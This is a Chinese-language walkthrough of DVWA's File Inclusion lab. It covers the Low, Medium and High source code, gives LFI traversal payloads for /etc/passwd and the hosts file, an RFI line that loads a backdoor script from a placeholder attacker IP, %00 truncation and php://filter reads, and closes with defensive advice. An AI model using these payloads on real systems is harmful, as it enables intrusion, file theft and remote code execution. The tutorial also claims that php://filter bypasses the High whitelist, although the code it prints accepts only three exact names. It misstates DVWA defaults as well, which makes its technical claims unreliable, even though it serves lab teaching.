# DVWA File Inclusion 文件包含 终极超细精讲（含报错根治\+底层原理\+零失误实操\+逐行源码解析\+本地/远程包含全覆盖）

## 0\. 零基础彻底吃透：文件包含（File Inclusion）核心本质（人话\+底层原理）

### 0\.1 官方名词通俗拆解

**File Inclusion 全称：服务器文件包含漏洞**

逐词通俗解读，摒弃晦涩术语，小白一看就懂：

File（文件）：服务器本地文件、远程网络文件，包含php、txt、日志、后门、配置文件等所有可读取文件资源

Inclusion（包含）：网站程序通过文件包含函数，加载、引入、解析指定文件内容，输出到页面展示

**终极一句话定义（面试/实操通用）：**文件包含漏洞是由于网站后端未对用户可控的文件路径参数做过滤、白名单校验、路径限制，导致攻击者可以任意修改文件读取路径，加载服务器本地任意文件或远程恶意文件，造成源码泄露、信息窃取、任意代码执行、服务器沦陷的高危漏洞。

### 0\.2 黄金生活化类比（小白秒懂攻击逻辑）

场景对标：**文件参数 = 书本编号，网站包含函数 = 读书员**

正常业务：网站固定读取指定页面文件（如index\.php、header\.php），读书员只读取规定书本，正常展示页面内容，安全合规。

包含攻击：读书员**不校验书本编号、不限制读取路径、不区分文件来源**，攻击者篡改编号对应的文件路径，让读书员读取私密配置、日志文件、甚至网上恶意脚本，全部直接解析执行。

核心特点：网站信任用户传入的文件路径参数，无任何校验，任意文件均可被加载解析，危害覆盖信息泄露到代码执行。

### 0\.3 文件包含核心分类（考试/实操必懂）

**1、本地文件包含 LFI（Local File Inclusion）**：仅读取服务器本地文件，无远程加载权限，Low/Medium核心攻击方式，主要用于泄露本地配置、日志、密钥文件

**2、远程文件包含 RFI（Remote File Inclusion）**：可加载远程URL恶意脚本，直接执行任意代码、植入后门，危害高于本地包含，仅Low级别可无防护利用

**3、过滤绕过文件包含**：中级存在后缀名追加、字符过滤缺陷，可通过截断、伪协议、特殊符号绕过，属于高频考点绕过场景

### 0\.4 文件包含成立三大必要条件（缺一不可）

1、**用户可控参数**：URL或表单存在可控的文件路径参数（如?page=、?file=），可自由篡改路径

2、**使用危险包含函数**：后端使用include、require、include\_once、require\_once四类高危文件包含函数

3、**无严格校验机制**：未做白名单文件限制、未过滤路径跳转符、未禁用远程URL加载、无后缀名校验

### 0\.5 新手必懂：文件包含为什么是高危漏洞？

文件包含属于Web超级高危漏洞，区别于普通越权、信息泄露漏洞，**可直接实现从读文件到代码执行的完整利用链**。本地包含可读取数据库账号密码、源码、服务器配置、日志信息；远程包含可直接加载木马脚本，执行任意系统命令，直接拿下服务器权限。

### 0\.6 【重点补强】文件包含核心函数\&四大利用方式 零基础精讲

DVWA三关所有出题逻辑、过滤规则、绕过思路，全部围绕**高危包含函数**和**路径可控缺陷**展开，零基础必须吃透核心原理与利用场景。

#### 0\.6\.1 四大高危包含函数（核心根源）

**include\(\)**：加载指定文件，文件不存在仅警告，程序继续运行，最常被利用

**require\(\)**：加载指定文件，文件不存在直接报错终止程序，容错低、利用场景少

**include\_once\(\)/require\_once\(\)**：仅加载一次文件，重复调用不生效，漏洞原理一致

#### 0\.6\.2 两大核心利用模式

**本地文件包含 LFI**：读取服务器本地绝对路径/相对路径文件，适配全等级，用于信息搜集、源码泄露、日志包含

**远程文件包含 RFI**：加载http/https远程恶意脚本，仅Low无防护可直接利用，实现一键代码执行

#### 0\.6\.3 辅助利用：PHP伪协议（高阶必考）

文件包含终极拓展利用方式，无视部分后缀过滤，可直接读取源码、执行代码：php://filter、php://input，是中级、高级绕过核心手段。

#### 0\.6\.4 路径跳转核心符号（漏洞利用关键）

**\.\./**：上级目录跳转符，用于跳出网站根目录，读取服务器系统全局文件，是LFI核心Payload组成部分。

## 1\. DVWA\-File Inclusion 模块通用底层逻辑（三关完全共用）

### 1\.1 模块核心功能

整个模块核心业务：**动态加载页面模板文件**。通过URL中page参数传递文件名，网站后端自动包含对应php页面，实现页面动态切换（常规业务：home\.php、about\.php、contact\.php切换展示）。

### 1\.2 正常手动操作完整流程

用户访问文件包含页面 → URL携带正常page参数（?page=home\.php） → 后端调用include函数加载对应文件 → 正常展示页面内容，无异常。

### 1\.3 漏洞核心根源（三关通用底层问题）

DVWA文件包含模块致命缺陷：**直接将用户可控的URL参数带入高危包含函数，无白名单绑定、无路径锁定、无远程加载限制**。

正常开发应固定可访问文件列表，仅允许指定文件名加载；而DVWA完全信任用户输入，攻击者可随意篡改参数为任意本地路径、远程URL，触发文件包含漏洞。

### 1\.4 新手高频报错\&失效通用根因（提前避坑）

1、路径错误：\.\./层数过多/过少，超出服务器目录范围或未跳出网站根目录

2、后缀冲突：中级自动追加\.php后缀，导致自定义路径失效、文件找不到

3、协议未开启：PHP默认关闭allow\_url\_include，部分环境RFI远程包含失效

4、安全等级未切换：关卡配置未保存，防护机制不匹配

5、伪协议格式错误：filter协议参数书写不规范，无法读取源码

6、系统路径混用：Windows/Linux系统绝对路径混用，导致文件读取失败

### 1\.5 关键前置：Windows \& Linux 文件包含核心路径区别（必考）

文件包含**最大新手误区**：跳转符号\.\./通用，但**系统绝对路径完全不通用**，跨系统混用直接读取失败、无回显。

#### 1\.5\.1 Windows系统 常用敏感路径

系统盘根目录、C:\\Windows\\system32\\drivers\\etc\\hosts、服务器日志文件、网站配置文件

#### 1\.5\.2 Linux系统 常用敏感路径

/etc/passwd、/etc/shadow、/etc/hosts、网站配置文件、系统日志、用户密钥文件

#### 1\.5\.3 通用规则

相对路径 \.\./ 跳转逻辑在Windows、Linux完全通用，仅精准读取敏感文件时需要适配系统路径。

# 第一关：File Inclusion Low 低级（无防护裸奔｜LFI\+RFI双利用\+逐行源码解析\+零报错实操）

## 1\.1 Low级别源码防护原理（完全无防护）

Low级别源码**无任何过滤、无后缀限制、无路径锁定、无远程加载拦截**，直接将URL接收的page参数原样带入include高危函数执行，属于完全裸奔的超高危文件包含漏洞，**本地包含、远程包含均可直接利用**。

## 1\.2 Low级别完整源码 \+ 逐行超细解析（必考）

```php
<?php
if( isset( $_GET[ 'page' ] ) ) {
    // Get page parameter
    $page = $_GET[ 'page' ];

    // Include the page
    include( $page );
}
?>
```

### 逐行白话拆解：

**第2行**：判断URL中是否存在page参数，存在则触发文件包含逻辑。

**第4行【致命漏洞行】**：直接通过GET获取用户可控参数，**无过滤、无校验、无修改、无拦截**，用户完全可控文件路径与来源。

**第7行【高危执行行】**：直接调用include函数加载用户传入的文件，支持本地路径、远程URL，无任何限制。

**源码总结**：极简裸奔漏洞，无任何安全防护，同时存在LFI本地文件包含、RFI远程文件包含双重高危漏洞，可实现读文件\+代码执行。

## 1\.3 Low漏洞深层原理

参数完全可控，无路径白名单、无后缀固定、无远程协议封禁。攻击者可通过\.\./跳转读取服务器任意本地敏感文件，也可传入http远程恶意脚本URL，直接解析执行PHP代码，危害拉满。

## 1\.4 Low级双模式核心Payload（LFI\+RFI双系统全覆盖）

### 1\.4\.1 本地文件包含 LFI Payload（全系统通用）

路径原理：通过多层\.\./跳出网站web根目录，读取服务器系统敏感文件

Linux万能读取：?page=\.\./\.\./\.\./\.\./etc/passwd

Windows万能读取：?page=\.\./\.\./\.\./\.\./Windows/System32/drivers/etc/hosts

拓展利用：读取网站配置文件、数据库配置、日志文件，泄露核心密钥

### 1\.4\.2 远程文件包含 RFI Payload（万能通杀）

前提：PHP配置项 **allow\_url\_include = On**（DVWA默认开启）

攻击逻辑：搭建远程恶意php后门文件，通过URL直接加载执行

标准Payload：?page=http://攻击者IP/恶意脚本\.php

核心效果：直接执行远程PHP代码，可一句话木马植入、系统命令执行，直接拿下服务器权限

## 1\.5 零失误通关实操步骤（新手逐行照做）

步骤1：进入DVWA Security安全设置，等级选择Low，点击Submit保存；

步骤2：进入File Inclusion文件包含模块，观察默认URL参数结构；

步骤3：替换URL中page参数为对应LFI/RFI纯净Payload；

步骤4：回车访问，页面成功加载敏感文件/执行远程脚本；

步骤5：Low关卡本地包含、远程包含双重利用通关。

## 1\.6 Low级所有失败场景\+根治方案（全覆盖）

1、路径读取为空：\.\./层数不足，未跳出网站根目录，增加跳转层数即可；

2、RFI执行失败：环境关闭allow\_url\_include，修改php\.ini配置开启；

3、文件不存在：系统路径混用，严格区分Windows/Linux敏感路径；

4、页面无响应：远程脚本地址无法访问，确保网络互通、URL无误。

# 第二关：File Inclusion Medium 中级（后缀强制追加\+字符黑名单过滤｜超细绕过\+逐行源码解析）

## 2\.1 Medium新增防护底层原理（通俗白话讲解）

开发者修复Low裸奔漏洞，新增**双重防护机制**：一是黑名单过滤远程协议与跳转符号，二是**强制追加\.php后缀**，大幅提升防护强度，但存在致命绕过缺陷。

**Medium后台校验规则**：过滤 http://、https://、\.\./、\.\.\\ 高危字符，同时无论用户传入什么参数，后端自动拼接 \.php 后缀。

**通俗理解**：禁止远程加载、禁止目录跳转，但过滤不严谨，后缀追加可被特殊符号截断绕过。

## 2\.2 Medium完整源码 \+ 逐行超细解析（必考绕过原理）

```php
<?php
if( isset( $_GET[ 'page' ] ) ) {
    // Get page parameter
    $page = $_GET[ 'page' ];

    // Filter input parameters
    $page = str_replace( array( 'http://', 'https://', '../', '..\\' ), '', $page );

    // Include the page with suffix
    include( $page . '.php' );
}
?>
```

### 逐行白话拆解\&amp;漏洞分析：

**第6行（核心防护行）**：使用str\_replace批量替换，清空远程协议和目录跳转符号，禁止RFI远程包含和常规LFI跳转。

**第9行（致命缺陷行）**：强制拼接\.php后缀，本意是固定文件格式，**但未拦截%00空字符截断**，可直接干掉后缀实现任意文件读取。

**致命缺陷（面试高频考点）**：黑名单过滤仅拦截明文符号，无法拦截URL编码空字符，后缀截断绕过是中级唯一核心解法。

**漏洞本质**：防护只做了明文拦截，未处理编码截断，强制后缀机制反而存在固定绕过漏洞。

## 2\.3 中级漏洞核心缺陷\&绕过原理（必考）

中级彻底封禁**远程RFI包含**（http/https全部清空），无法加载远程脚本，仅能利用本地LFI包含。

最大漏洞：**%00 空字符截断漏洞**。%00在URL解码后为空字符，可直接截断后端自动追加的\.php后缀，让后缀失效，实现任意本地文件读取。

**终极绕过本质**：利用%00空字符吞噬后端追加的\.php后缀，绕过后缀强制绑定，读取无后缀的系统敏感文件。

## 2\.4 LowPayload在中级失效的原因

1、常规\.\./跳转被明文过滤，直接清空失效；

2、无后缀Payload会被自动追加\.php，导致路径错误、文件不存在；

3、远程URL协议被过滤，RFI彻底无法利用。

## 2\.5 中级零报错绕过双系统Payload（仅可用，无失效）

### Windows系统 Medium 专属Payload

核心截断绕过：?page=file://C:/Windows/System32/drivers/etc/hosts%00

### Linux系统 Medium 专属Payload

核心截断绕过：?page=file:///etc/passwd%00

**原理拆解**：%00截断后端\.php后缀，最终加载路径为用户自定义的敏感文件路径，无后缀干扰，读取成功。

**绝对禁止**：明文\.\./跳转、http远程URL，全部拦截失效

## 2\.6 中级高阶拓展：伪协议读取源码（无路径依赖）

适配中级过滤规则，无需路径跳转，直接读取PHP源码（自动解密展示）

通用Payload：?page=php://filter/convert\.base64\-encode/resource=index%00

效果：Base64加密读取本地PHP源码，解密后可获取网站核心代码、配置信息。

## 2\.7 中级零报错实操步骤（超细适配过滤规则）

步骤1：DVWA Security切换等级为Medium，Submit保存配置；

步骤2：进入文件包含页面，修改URL中page参数为%00截断Payload；

步骤3：确保%00小写、置于路径末尾，无多余字符；

步骤4：回车访问，成功读取系统敏感文件/网站源码；

步骤5：中级关卡成功通关。

## 2\.8 中级高频报错\&失效根源（精准避坑）

1、使用明文\.\./跳转：直接被过滤清空，攻击失效；

2、%00位置错误：未放在路径末尾，无法截断后缀；

3、PHP版本过高：PHP5\.3以上默认修复%00截断漏洞，需适配低版本环境；

4、路径书写错误：系统绝对路径书写不规范，文件读取失败。

# 第三关：File Inclusion High 高级（白名单严格校验｜唯一伪协议绕过\+逐行源码解析）

## 3\.1 高级防护全面升级（彻底淘汰低中级所有方法）

High级别彻底重构防护逻辑，放弃黑名单过滤，采用**白名单精准匹配机制**。仅允许加载 home、about、contact 三个指定文件，彻底封禁所有自定义路径、远程URL、截断绕过，防护强度拉满。

低中级的%00截断、路径跳转、远程包含全部失效，常规绕过方式完全无法利用。

## 3\.2 High完整源码 \+ 逐行超细解析（终极绕过考点）

```php
<?php
if( isset( $_GET[ 'page' ] ) ) {
    // Get page parameter
    $page = $_GET[ 'page' ];

    // White list verification
    switch( $page ) {
        case 'home':
        case 'about':
        case 'contact':
            include( $page . '.php' );
            break;
        default:
            echo "ERROR: Invalid file parameter!";
    }
}
?>
```

### 逐行白话拆解\&漏洞绕过核心：

**第7\-13行（核心防护）**：通过switch严格白名单匹配，仅三个固定文件名合法，其余所有参数直接报错拒绝包含。

**开发者防护思路**：摒弃不安全的黑名单，使用最安全的白名单机制，固定所有可加载文件，杜绝任意文件包含。

**终极漏洞缺陷（面试重难点）**：

1、白名单仅校验**参数文本内容**，未校验参数解析后的文件来源；

2、支持PHP伪协议传入，伪协议字符串可绕过白名单文本匹配；

3、仅禁止自定义路径读取，未禁止伪协议解析，存在唯一绕过入口。

## 3\.3 High防护完整底层原理（人话通俗吃透）

1、彻底封杀所有自定义路径、远程URL、空字符截断，黑名单绕过全部失效；

2、仅放行三个固定页面参数，严格限制可加载文件范围；

3、防护逻辑本身极度安全，唯一缺陷是**未拦截PHP伪协议**，属于语言层面特性绕过，非代码逻辑漏洞。

## 3\.4 高级漏洞唯一突破口（面试必考重难点）

高级白名单只校验**纯文本文件名**，无法识别**伪协议指令字符串**。利用 **php://filter 伪协议** 可绕过白名单校验，读取当前目录下的PHP源码文件，是高级关卡**唯一合法绕过方式**。

注意：高级无法读取系统本地敏感文件、无法远程执行代码，仅能实现本站源码读取利用。

## 3\.5 高级专属唯一可用Payload（零报错）

**通用万能Payload（全环境通杀）**：

?page=php://filter/convert\.base64\-encode/resource=home

**拓展读取**：替换resource值为about/contact，读取对应页面源码

**原理拆解**：伪协议字符串绕过白名单文本校验，后端解析协议后读取对应php文件，Base64编码输出源码，规避所有防护规则。

**高级绝对禁忌**：%00截断、路径跳转、远程URL全部失效，切勿尝试！

## 3\.6 高级零失误通关教程（百分百成功）

步骤1：DVWA Security切换等级为High，Submit保存配置，刷新页面重置会话；

步骤2：进入文件包含模块，修改URL page参数为filter伪协议Payload；

步骤3：无需多余修改，直接回车访问；

## 文件包含漏洞危害（实操/面试必背，通俗易懂）

1、**服务器敏感信息泄露**：读取系统密码文件、hosts文件、服务器日志、网站配置、数据库密钥，泄露核心资产；

2、**网站源码完全泄露**：通过伪协议读取全站PHP源码，挖掘更多隐藏漏洞、后台地址、接口密钥；

3、**任意代码执行（RFI）**：低级远程包含可直接加载恶意木马，执行系统命令，控制网站权限；

4、**组合漏洞提权**：结合文件上传、日志写入漏洞，实现文件包含\+木马执行组合利用，拿下服务器权限。

## 文件包含终极防御方案（根治漏洞的5种核心手段，通俗解读）

1、**白名单机制（最优方案）**：严格限制可加载文件列表，仅放行业务所需文件，彻底杜绝任意文件包含；

2、**禁用远程包含协议**：修改php\.ini，关闭allow\_url\_include，彻底封禁RFI远程文件包含攻击；

3、**过滤特殊字符与协议**：拦截\.\./、\.\.\\、http、https、php://等高危字符与伪协议，阻断绕过入口；

4、**固定文件后缀与路径**：后台锁定文件存储目录，强制固定文件后缀，禁止用户自定义路径与格式；

5、**替换安全函数**：摒弃include高危包含函数，使用文件读取专用安全函数，禁止动态加载文件。
